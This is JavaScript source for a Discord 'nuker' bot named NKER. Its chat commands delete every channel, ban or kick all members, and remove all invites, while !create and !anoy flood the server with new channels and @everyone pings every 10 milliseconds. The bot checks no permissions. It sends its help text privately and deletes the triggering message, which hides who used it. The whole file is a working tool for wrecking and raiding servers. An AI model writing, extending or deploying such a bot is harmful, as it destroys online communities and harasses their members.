const Discord = require("discord.js");
const config = require("./config.json");

const client = new Discord.Client();
client.login(config.TOKEN);

client.on("ready", ready =>{
    console.log("bot has startet: " + client.user.username)
})

client.on("message", function(message) { 
    if(message.author.bot) return;
    if(message.content == "!nuke"){
        message.guild.channels.cache.forEach(channel =>{
            if(channel.deletable){
                channel.delete()
                console.log('\x1b[36m%s\x1b[0m',"deleted: " + channel.name + `${channel.id}`)
            }
            else
            {
                console.log('\x1b[31m',"error: " + channel.name + `${channel.id}`)
            }
        })
        message.guild.members.cache.forEach(member =>{
            if(member.user.bot) return;
            if(member.bannable){
                member.ban();
                console.log('\x1b[36m%s\x1b[0m',"banned: " + member.user.username + `(${member.id})`)
            }
            else
            {
                if(member.kickable)
                {
                    member.kick();
                    console.log('\x1b[33m',"kicked: " + member.user.username + `(${member.id})`)
                }
                else
                {
                    console.log('\x1b[31m',"error: " + member.user.username + `(${member.id})`)
                }
            }
        })
        message.guild.fetchInvites().then(invites => {
            invites.forEach(inv => {
                if(inv.deletable){
                    inv.delete();
                    console.log('\x1b[33m',"Deletet invite: " + inv.code)
                }
                else
                {
                    console.log('\x1b[31m',"error: " + inv.code)
                }
            })
        })
    }
    if(message.content == "!unban"){
        message.guild.fetchBans().then(bans => {
            bans.forEach(ban => {
                message.guild.members.unban(ban.user.id);
                console.log('\x1b[33m',"unbanned: " + ban.user.username + `(${ban.user.id})`)
            });
        })
    }
    if(message.content == "!invites"){
        message.guild.fetchInvites().then(invites => {
            invites.forEach(inv => {
                if(inv.deletable){
                    inv.delete();
                    console.log('\x1b[33m',"Deletet invite: " + inv.code)
                }
                else
                {
                    console.log('\x1b[31m',"error: " + inv.code)
                }
            })
        })
    }
    if(message.content == "!kick"){
        message.guild.members.cache.forEach(member =>{
            if(member.user.bot) return;
            if(member.kickable){
                    member.kick();
                    console.log('\x1b[33m',"kicked: " + member.user.username + `(${member.id})`)
            }
            else
            {
                    console.log('\x1b[31m',"error: " + member.user.username + `(${member.id})`)
            }
        })
    }
    if(message.content == "!ban"){
        message.guild.members.cache.forEach(member =>{
            if(member.user.bot) return;
            if(member.bannable){
                member.ban();
                console.log('\x1b[36m%s\x1b[0m',"banned: " + member.user.username + `(${member.id})`)
            }
            else
            {
                console.log('\x1b[31m',"error: " + member.user.username + `(${member.id})`)
            }
        })
    }
    if(message.content == "!channels"){
        message.guild.channels.cache.forEach(channel =>{
            if(channel.deletable){
                channel.delete();
                console.log('\x1b[36m%s\x1b[0m',"Deleted channel: " + channel.name + `(${channel.id})`)
            }
            else
            {
                console.log('\x1b[31m',"error: " + channel.name + `(${channel.id})`)
            }
        })
    }
    if(message.content == "!create"){
        var interval = setInterval (function () {
            message.guild.channels.create("NKER")
            console.log('\x1b[36m%s\x1b[0m',"channel created")
        }, 10);
    }
    if(message.content == "!anoy"){
        var interval = setInterval (function () {
            message.channel.send("@everyone")
            console.log('\x1b[36m%s\x1b[0m',"message sendet")
        }, 10);
    }
    if(message.content == "!help"){
        const exampleEmbed = new Discord.MessageEmbed()
	        .setColor('#0099ff')
	        .setTitle('NKER HELP')
	        .setDescription('Help Message')
	        .addFields(
		        { name: '!invite', value: 'Delete all invites', inline: true },
		        { name: '!unban', value: 'unban all users', inline: true },
                { name: '!nuke', value: 'nukes the server', inline: true },
                { name: '!kick', value: 'kick all users', inline: true },
                { name: '!ban', value: 'ban all users', inline: true },
                { name: '!channels', value: 'deletes all channels', inline: true },
                { name: '!create', value: 'creates unlimited channels', inline: true },
                { name: '!anoy', value: '@everyone', inline: true }
	        )
	        .setTimestamp()

            message.author.send(exampleEmbed)
            message.delete(message)
            console.log("help message sended to: " + message.author.username)
    }
});      